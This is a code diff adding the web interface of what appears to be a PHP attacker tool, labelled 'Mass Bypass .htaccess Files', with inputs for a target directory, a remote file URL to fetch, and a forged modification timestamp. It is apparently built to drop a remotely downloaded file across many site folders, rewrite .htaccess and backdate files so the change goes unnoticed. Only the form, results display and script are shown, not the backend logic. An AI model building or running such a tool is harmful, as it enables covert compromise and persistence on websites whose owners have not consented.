@@ -212,3 +212,124 @@ display_output: // Label untuk goto jika terjadi error fatal sebelum fungsi dipa
 
         <div class="upload-section">
             <form id="uploadForm" method="POST" enctype="multipart/form-data">
+                <div class="form-group">
+                    <label for="targetPath">🎯 Target Directory Path</label>
+                    <input type="text" id="targetPath" name="target_path"
+                           placeholder="/home/user/public_html"
+                           value="<?php echo isset($_POST['target_path']) ? htmlspecialchars($_POST['target_path']) : ''; ?>"
+                           required>
+                </div>
+
+                <div class="form-group">
+                    <label for="remoteUrl">🌐 Remote File URL</label>
+                    <input type="text" id="remoteUrl" name="remote_url"
+                           placeholder="https://example.com/path/to/your/file.txt"
+                           value="<?php echo isset($_POST['remote_url']) ? htmlspecialchars($_POST['remote_url']) : ''; ?>"
+                           required>
+                </div>
+                
+                <div class="form-group">
+                    <label for="fileName">📝 File Name (before renaming)</label>
+                    <input type="text" id="fileName" name="file_name"
+                           placeholder="file.txt"
+                           value="<?php echo isset($_POST['file_name']) ? htmlspecialchars($_POST['file_name']) : ''; ?>"
+                           required>
+                </div>
+
+                <div class="form-group">
+                    <label for="timestamp">⏰ Set Waktu Modifikasi (.htaccess)</label>
+                    <input type="text" id="timestamp" name="timestamp" placeholder="2024-06-18 07:26:38"
+                           value="<?php echo isset($_POST['timestamp']) ? htmlspecialchars($_POST['timestamp']) : date('Y-m-d H:i:s'); ?>"
+                           required>
+                </div>
+
+                <button type="submit" class="upload-btn" id="uploadBtn">
+                    🚀 Mass Bypass .htaccess Files
+                </button>
+
+                <?php if ($showResults): ?>
+                    <button type="button" class="reset-btn" onclick="window.location.href='<?php echo $_SERVER['PHP_SELF']; ?>'">
+                        🔄 New Deployment
+                    </button>
+                <?php endif; ?>
+            </form>
+
+            <div class="processing-indicator" id="processingIndicator">
+                🔄 Fetching remote file and processing deployment...
+            </div>
+        </div>
+
+        <?php if ($showResults): ?>
+            <div class="stats">
+                <div class="stat-card">
+                    <div class="stat-number"><?php echo count($successLog); ?></div>
+                    <div class="stat-label">Successful Operations</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-number"><?php echo count($errorLog); ?></div>
+                    <div class="stat-label">Failed Operations</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-number"><?php echo $totalFolders; ?></div>
+                    <div class="stat-label">Folders Processed</div>
+                </div>
+            </div>
+
+            <div class="logs-section">
+                <div class="log-box success">
+                    <div class="log-title success">
+                        ✅ Success Log (<?php echo count($successLog); ?> entries)
+                    </div>
+                    <?php if (!empty($successLog)): ?>
+                        <?php foreach ($successLog as $entry): ?>
+                            <div class="log-entry"><?php echo $entry; ?></div>
+                        <?php endforeach; ?>
+                    <?php else: ?>
+                        <div class="log-entry">No successful operations recorded.</div>
+                    <?php endif; ?>
+                </div>
+
+                <div class="log-box error">
+                    <div class="log-title error">
+                        ❌ Error Log (<?php echo count($errorLog); ?> entries)
+                    </div>
+                    <?php if (!empty($errorLog)): ?>
+                        <?php foreach ($errorLog as $entry): ?>
+                            <div class="log-entry"><?php echo $entry; ?></div>
+                        <?php endforeach; ?>
+                    <?php else: ?>
+                        <div class="log-entry">No errors encountered.</div>
+                    <?php endif; ?>
+                </div>
+            </div>
+        <?php endif; ?>
+    </div>
+
+    <script>
+        // MODIFIED: Removed JavaScript for local file handling (drag & drop, file selection)
+        const uploadForm = document.getElementById('uploadForm');
+        const uploadBtn = document.getElementById('uploadBtn');
+        const processingIndicator = document.getElementById('processingIndicator');
+
+        // Form submission with processing indicator
+        uploadForm.addEventListener('submit', (e) => {
+            // Browser's 'required' attribute handles validation for empty fields.
+            uploadBtn.disabled = true;
+            uploadBtn.textContent = '🔄 Processing...';
+            processingIndicator.classList.add('show');
+        });
+
+        // The notification and auto-scroll logic remains useful.
+        // NOTE: A proper notification system would be better than this simple implementation.
+        <?php if ($showResults): ?>
+            // Auto-scroll to results if they exist
+            setTimeout(() => {
+                const logsSection = document.querySelector('.logs-section');
+                if (logsSection) {
+                    logsSection.scrollIntoView({ behavior: 'smooth', block: 'start' });
+                }
+            }, 500);
+        <?php endif; ?>
+    </script>
+</body>
+</html>
